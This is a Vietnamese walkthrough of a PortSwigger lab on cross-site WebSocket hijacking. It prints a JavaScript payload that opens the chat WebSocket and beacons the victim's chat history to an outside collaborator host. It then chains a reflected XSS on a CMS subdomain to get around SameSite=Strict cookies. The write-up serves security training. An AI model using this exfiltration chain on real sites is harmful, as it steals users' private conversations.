![image](https://github.com/user-attachments/assets/e58a53ff-142e-43d1-91c1-47b32feafdcd)

Ở challenge này thì chúng ta phải khai thác thông qua `Cross-site WebSocket hijacking`.

Cross-Site WebSocket Hijacking (CSWSH) là một kỹ thuật tấn công bảo mật khai thác cách ứng dụng xử lý các kết nối WebSocket để đánh cắp hoặc thao tác dữ liệu nhạy cảm.

Bạn muốn biết chi tiết thì đọc thêm link tôi gửi phía dưới.

![image](https://github.com/user-attachments/assets/fa62a0b6-13cd-4773-abeb-0272712b6b1a)

Chức năng live chat sử dụng web socket.

![image](https://github.com/user-attachments/assets/cf3112eb-fc48-4b41-94dd-81b53a137041)

![image](https://github.com/user-attachments/assets/2aef2dea-fc5d-44e7-8bcd-31236e39ecff)

Ta có thể thấy được rằng khi sẵn sàng thì client sẽ gửi thông báo "READY" đến server.

Tiến hành tạo 1 payload đơn giản để check lỗi `Cross-site WebSocket hijacking`

```
<script>
    var ws = new WebSocket('wss://0aad005d0351668580bdf483001b0082.web-security-academy.net/chat');
    ws.onopen = function() {
        ws.send("READY");
    };
    ws.onmessage = function(event) {
        navigator.sendBeacon('https://yz1lj4w6cbrjx0myil1lppzsljraf43t.oastify.com', event.data);
    };
</script>
```

**Giải thích đơn giản về payload:**

_Khởi tạo WebSocket:_

```
var ws = new WebSocket('wss://YOUR-LAB-ID.web-security-academy.net/chat');
```

Lệnh này tạo một kết nối WebSocket từ client đến server (URL chỉ định đến `endpoint /chat` của ứng dụng mục tiêu).

_Sự kiện onopen:_

```
ws.onopen = function() {
    ws.send("READY");
};
```

Khi kết nối WebSocket được mở thành công, lệnh `ws.send("READY");` sẽ gửi thông báo "READY" đến server. Server sẽ phản hồi với dữ liệu chat history hoặc nội dung đã lưu (ví dụ: lịch sử tin nhắn).

_Sự kiện onmessage:_

```
ws.onmessage = function(event) {
    navigator.sendBeacon('https://YOUR-COLLABORATOR-PAYLOAD.oastify.com', event.data);
};
```

Khi server gửi phản hồi qua WebSocket, phản hồi đó sẽ kích hoạt onmessage. Tham số `event.data` chứa nội dung được server gửi về, ở đây là `chat history`.

`navigator.sendBeacon` gửi dữ liệu đến một URL khác (ở đây là `https://YOUR-COLLABORATOR-PAYLOAD.oastify.com`). Phương thức này đảm bảo dữ liệu sẽ được gửi đi ngay cả khi trang web bị đóng đột ngột.

![image](https://github.com/user-attachments/assets/64980cef-cb05-46fd-9e62-73f6a1ebbcaa)

Sau khi gửi payload thì xác nhận là có bug.

Tiếp theo là vào url này:

```
https://exploit-0af200ce0353f22980cec5a7013c000d.exploit-server.net/exploit
```

Và tiến hành quan sát burp thì ta thấy được 

![image](https://github.com/user-attachments/assets/ffa833ea-aa5f-4731-b75b-05dc5afdf7e2)

Request nó không có gửi cookie đi do có `samesite: strict`.

![image](https://github.com/user-attachments/assets/c2a04818-50fe-490d-bc71-9da17b7c0642)

Sau khi đi hết các ngóc ngách của challenge này thì tôi phát hiện ra tại `/resources/images/shop.svg` có lộ 1 subdomain thông qua `Access-Control-Allow-Origin` (1 cơ chế bảo mật thuộc `CORS`)

![image](https://github.com/user-attachments/assets/06f118d3-897c-4446-9c63-8f36b31b942b)

Dường như là 1 trang login.

![image](https://github.com/user-attachments/assets/a037c6fa-89dd-4487-9f15-5d41b233d98a)

Thử đăng nhập đại vào thì nó lại báo là `invalid username` và còn in ra màn hình nữa chớ, cùng check thử xem nó có bị html injection không nhé.

![image](https://github.com/user-attachments/assets/df4c8349-91bd-435f-ae9d-96adacf30095)

Nó bị html injection và khi tôi test với tag script thì nó cũng bị xss luôn, nó không sanitizer cái gì hết :">

vậy giờ ta hãy lợi dụng xss ở trang này để thực thi code js ở trang kia. 

Tiến hành tạo 1 payload GET như các challenge trước với mục đích là để lợi dụng các same origin để thực thi payload (`bypass samesite: strict`).

```
<script>
    document.location = "https://cms-YOUR-LAB-ID.web-security-academy.net/login?username=YOUR-URL-ENCODED-CSWSH-SCRIPT&password=anything";
</script>
```

Đó, tại vì đây là url nên phải url encode đoạn script kia :"))

![image](https://github.com/user-attachments/assets/7d9fa1d5-3b75-49a1-94f3-559546f67f22)

![image](https://github.com/user-attachments/assets/b961e8b8-42ed-40c5-9596-80bd336b5c21)

Tiến hành gửi cho con bot.

![image](https://github.com/user-attachments/assets/3b2a29e4-b09d-4ef6-9c3f-772cd1f4f22e)

Vào collaborator thì ta đã lấy được thành công thông tin của đoạn chat này

![image](https://github.com/user-attachments/assets/a557de53-b1b6-4227-b152-e595d501087e)

Thành công

## REFERENCES
[1]. https://portswigger.net/web-security/websockets/cross-site-websocket-hijacking

[2]. https://portswigger.net/web-security/websockets/what-are-websockets#how-are-websocket-connections-established
